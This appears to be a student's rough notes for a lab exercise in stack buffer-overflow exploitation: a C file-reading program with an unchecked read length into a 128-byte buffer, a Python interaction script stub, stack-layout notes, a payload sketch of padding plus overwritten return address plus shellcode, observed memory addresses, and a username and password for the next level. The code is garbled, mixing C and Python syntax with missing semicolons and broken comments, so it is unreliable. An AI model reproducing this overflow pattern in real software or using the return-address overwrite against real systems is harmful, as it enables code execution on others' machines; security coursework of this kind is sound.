
# define MAX_BUFSIZE 128
# define FILENAME "hack"

from scaffold import SHELLCODE
import scaffold as p
/* Hint: No memory safety errors in this function * /
define EXIT_WITH_ERROR(message) do {
    fprintf(stderr, "%s\n", message)
    exit(EXIT_FAILURE)
} while (0)

/* Hint: No memory safety errors in this function * /
int file_is_too_big(int fd) {
    struct stat st
    fstat(fd, & st)
    return st.st_size >= MAX_BUFSIZE
}

void read_file() {
    char buf[MAX_BUFSIZE]
    uint32_t bytes_to_read

    int fd = open(FILENAME, O_RDONLY)
    if (fd == -1) EXIT_WITH_ERROR("Could not find file!")

    if (file_is_too_big(fd)) EXIT_WITH_ERROR("File too big!")

    printf("How many bytes should I read? ")
    fflush(stdout)
    # %u means print an unsigned int
    if (scanf("%u", & bytes_to_read) != 1)
    EXIT_WITH_ERROR("Could not read the number of bytes to read!")

    ssize_t bytes_read = read(fd, buf, bytes_to_read)
    if (bytes_read == -1) EXIT_WITH_ERROR("Could not read!")

    buf[bytes_read] = 0
    printf("Here is the file!\n%s", buf)
    close(fd)
}

int main() {
    read_file()
    return 0
}
# Stack of read file
[4] RIP of read file
[4] SFP of read file
[N] compiler padding
[128] buf
# Skal bli 148 totalt!!

# Interact file:

### YOUR CODE STARTS HERE ###

with open('hack', 'w') as f:
    f.write('Hello world!!!!!!\n')

p.start()
print(p.recv(40))

p.send('120\n')

print(p.recv(40))
assert p.recv(18) == 'Here is the file!\n'
print p.recv(12)

128*'A'+7*4*'A' også adressen+shellcode
### YOUR CODE ENDS HERE ###

RIP its value: 0x804939c
RIP at:  0xffffd66c

new address: FF FF D6 70
= '\x70\xd6\xff\xff'

# Length of shellcode is 72

# address of buf 0xffffd5d8

Next username: antares
Next password: thatlanguage

#address of buf
0xffffd5d8